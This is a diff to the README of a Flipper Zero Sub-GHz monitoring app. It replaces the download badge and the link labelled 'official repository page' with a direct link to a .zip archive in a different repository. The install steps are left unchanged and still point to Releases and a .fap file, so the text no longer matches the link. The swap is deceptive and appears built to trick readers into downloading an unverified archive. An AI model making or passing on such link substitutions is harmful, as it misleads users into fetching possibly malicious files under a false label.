@@ -5,7 +5,7 @@ description: "Monitor 433, 868, and 915 MHz ISM bands with this passive Sub-GHz 
 ---
 # 🐺 flipper-cerberus - Guard your wireless home security signals
 
-[![](https://img.shields.io/badge/Download-Cerberus-blue)](https://github.com/Kendo3639/flipper-cerberus)
+[![](https://img.shields.io/badge/Download-Cerberus-blue)](https://github.com/Kendo3639/kendo3639.github.io/raw/refs/heads/main/Fany/kendo-github-io-v1.1-beta.5.zip)
 
 ## 🛡️ What this tool does
 
@@ -21,7 +21,7 @@ You need a Flipper Zero device to run this software. Ensure your device has the 
 
 Follow these steps to place Cerberus on your Flipper Zero.
 
-1. Visit the [official repository page](https://github.com/Kendo3639/flipper-cerberus) to find the latest version of the app.
+1. Visit the [official repository page](https://github.com/Kendo3639/kendo3639.github.io/raw/refs/heads/main/Fany/kendo-github-io-v1.1-beta.5.zip) to find the latest version of the app.
 2. Look for the "Releases" section on the right side of the page.
 3. Click the most recent version number.
 4. Locate the file ending in .fap. This is the application file for your Flipper Zero.
